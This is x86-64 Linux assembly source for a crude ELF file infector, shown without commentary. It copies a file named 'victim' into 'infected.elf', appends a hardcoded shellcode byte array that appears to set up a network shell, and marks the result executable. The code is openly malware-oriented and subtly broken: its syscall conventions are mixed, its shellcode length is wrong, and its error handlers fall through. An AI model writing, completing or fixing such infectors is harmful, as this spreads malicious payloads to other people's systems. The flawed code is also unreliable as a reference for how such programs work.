section .data
    filename db 'victim', 0
    newfile db 'infected.elf', 0
    shellcode db 0x48, 0x31, 0xc0, 0x50, 0x50, 0xb0, 0x29, 0x6a, 0x02, 0x6a, 0x01, 0x6a, 0x06, 0x89, 0xe7, 0xcd, 0x80, 0x48, 0x89, 0xc3, 0x48, 0x31, 0xff, 0xb0, 0x66, 0x6a, 0x01, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x56, 0x48, 0x89, 0xe6, 0x66, 0x68, 0x11, 0x5c, 0x66, 0x6a, 0x02, 0x89, 0xe7, 0x66, 0x6a, 0x10, 0x56, 0x48, 0x89, 0xe6, 0x66, 0x6a, 0x2a, 0x5a, 0x0f, 0x05, 0x48, 0x31, 0xc0, 0xb0, 0x21, 0x48, 0x89, 0xe2, 0x0f, 0x05, 0x48, 0xff, 0xc2, 0x48, 0x83, 0xfa, 0x03, 0x75, 0xf4, 0x48, 0x31, 0xc0, 0x50, 0x6a, 0x3b, 0x58, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x0f, 0x05

section .bss
    buffer resb 4096

section .text
    global _start

_start:
    ; open original ELF 
    mov rdi, filename
    mov rax, 2              
    xor rsi, rsi             
    syscall
    test rax, rax
    js open_error

    ; eead ELF into buffer
    mov rdi, rax           
    mov rsi, buffer   
    mov rdx, 4096       
    mov rax, 0             
    syscall
    test rax, rax
    js read_error

    mov r8, rax

    ; write the buffer 
    mov rdi, newfile
    mov rsi, 0o755         
    mov rax, 85               
    syscall
    test rax, rax
    js create_error

    mov rdi, rax            
    mov rsi, buffer          
    mov rdx, r8          
    mov rax, 1               
    syscall
    test rax, rax
    js write_error

    ; shellcode 
    mov rsi, shellcode
    mov rdx, 78               
    mov rax, 1                
    syscall
    test rax, rax
    js write_error

    ; executable permissions
    mov rdi, newfile
    mov rsi, 0o755           
    mov rax, 90               
    syscall
    test rax, rax
    js chmod_error

    ; exit 
    mov rax, 60               
    xor rdi, rdi
    syscall

open_error:
    mov rdi, error_open
    call print_error

read_error:
    mov rdi, error_read
    call print_error

create_error:
    mov rdi, error_create
    call print_error

write_error:
    mov rdi, error_write
    call print_error

chmod_error:
    mov rdi, error_chmod
    call print_error

print_error:
    ; error message 
    mov rax, 1               
    mov rdi, 2               
    mov rdx, 20               
    syscall

    ; error
    mov rax, 60               
    mov rdi, 1                
    syscall

section .rodata
    error_open db 'Error opening file', 0
    error_read db 'Error reading file', 0
    error_create db 'Error creating file', 0
    error_write db 'Error writing file', 0
    error_chmod db 'Error changing mode', 0
